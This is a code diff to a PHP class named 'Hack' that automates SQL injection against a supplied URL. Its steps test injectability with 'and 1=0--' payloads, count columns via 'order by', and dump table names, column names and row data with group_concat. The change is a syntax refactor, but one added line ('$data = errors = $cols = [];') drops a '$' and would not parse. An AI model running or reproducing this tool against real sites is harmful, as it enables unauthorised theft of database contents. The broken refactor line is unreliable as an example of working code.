@@ -60,13 +60,13 @@ class Hack
 	public function action()
 	{
 		if (!isset($_GET['action']) || !in_array($_GET['action'], $this->getAvailablesAction())) {
-			return $this->sendResponse(array('error' => 'Action not available'));
+			return $this->sendResponse(['error' => 'Action not available']);
 		} 
 		
 		$this->url 	= (isset($_GET['url'])) ? base64_decode($_GET['url']) : null; 
 		
 		if ($this->url  === null || $this->_checkUrl($this->url) !== 1) {
-			return $this->sendResponse(array('error' => 'Url is incorrect'));
+			return $this->sendResponse(['error' => 'Url is incorrect']);
 		}
 		
 		$this->_action 	= $_GET['action'];
@@ -76,7 +76,7 @@ class Hack
 		if (method_exists($this, $method)) {
 			$this->$method();
 		} else {
-			return $this->sendResponse(array('error' => 'Method not available'));
+			return $this->sendResponse(['error' => 'Method not available']);
 		}
 	}
 	
@@ -87,7 +87,7 @@ class Hack
 	 */
 	protected function checkIsHackableAction()
 	{
-		$data 				= array();
+		$data 				= [];
 		$url 				= $this->url . '+and+1=0--';
 		$before 			= $this->call($url);
 		$url				= $this->url . '+and+1=1--';
@@ -106,7 +106,7 @@ class Hack
 	protected function getHowMuchColsAction()
 	{
 		$nbrCols 	= 0;
-		$data 		= array();
+		$data 		= [];
 
 		for ($i=1;$i<=self::NBR_POTENTIAL_COL_ITERATION;$i++) {
 			$url = $this->url . '+order+by+' .$i.'--';
@@ -134,8 +134,7 @@ class Hack
 	 */
 	protected function getTablesNameAction()
 	{
-		$data 		= array();
-		$errors 	= array();
+		$data = errors = $cols = [];
 		
 		if (!isset($_GET['nbr_cols'])) {
 			$errors['error'][] = 'Int for nbr cols is required';
@@ -144,7 +143,6 @@ class Hack
 		if (empty($errors)) {
 			$nbrCols = $_GET['nbr_cols'];
 			
-			$cols = array();
 			for ($i = 1; $i<=$nbrCols; $i++) {
 				$cols[] = 'group_concat(distinct+table_name+order+by+table_name+asc)';
 			}
@@ -171,7 +169,7 @@ class Hack
 	 */
 	protected function getColsNameAction()
 	{
-		$errors = array();
+		$errors = $cols = [];
 		
 		if (!isset($_GET['nbr_cols'])) {
 			$errors['error'][] = 'Int for nbr cols is required';
@@ -185,7 +183,6 @@ class Hack
 			$tableName 	= $this->asciiConvertor($_GET['table']);
 			$nbrCols 	= $_GET['nbr_cols'];
 			
-			$cols = array();
 			for ($i = 1; $i<=$nbrCols; $i++) {
 				$cols[] = 'group_concat(column_name)';
 			}
@@ -211,7 +208,7 @@ class Hack
 	 */
 	protected function getFinalDataAction()
 	{
-		$errors = array();
+		$errors = $cols = [];
 		
 		if (!isset($_GET['nbr_cols'])) {
 			$errors['error'][] = 'Int for nbr cols is required';
@@ -231,7 +228,6 @@ class Hack
 			$nbrCols 	= $_GET['nbr_cols'];
 			$colName	= explode(',',$_GET['col']);
 			
-			$cols = array();
 			for ($i = 1; $i<=$nbrCols; $i++) {
 				$z = $i - 1;
 				
@@ -263,7 +259,7 @@ class Hack
 	 */
 	protected function getLogAction()
 	{
-		$data = array();
+		$data = [];
 		$data['content'] = file_get_contents($this->filepath);
 		return $this->sendResponse($data);
 	}
@@ -335,7 +331,7 @@ class Hack
 	private function getUpperCaseInfo($content)
 	{
 		$result = "";
-		$matches = array();
+		$matches = [];
 		
 		if (preg_match_all("/([A-Za-z0-9_]+)([,]?)/", $content, $matches)) {
 			foreach ($matches as $match) {
@@ -354,13 +350,13 @@ class Hack
 	 */
 	protected function getAvailablesAction()
 	{
-		return array (
+		return [
 			self::CHECK_IS_HACKABLE_ACTION,
 			self::GET_HOW_MUCH_COLS_ACTION,
 			self::GET_TABLES_NAME_ACTION,
 			self::GET_COLS_NAME_ACTION,
 			self::GET_FINAL_DATA_ACTION,
-		);
+		];
 	}
 	
 	/**
@@ -372,7 +368,7 @@ class Hack
 	 */
 	protected function asciiConvertor($string)
 	{
-		$convertors = array();
+		$convertors = [];
 		
 		for ($i = 0; $i<strlen($string); $i++) {
 			$convertors[] = ord($string[$i]);
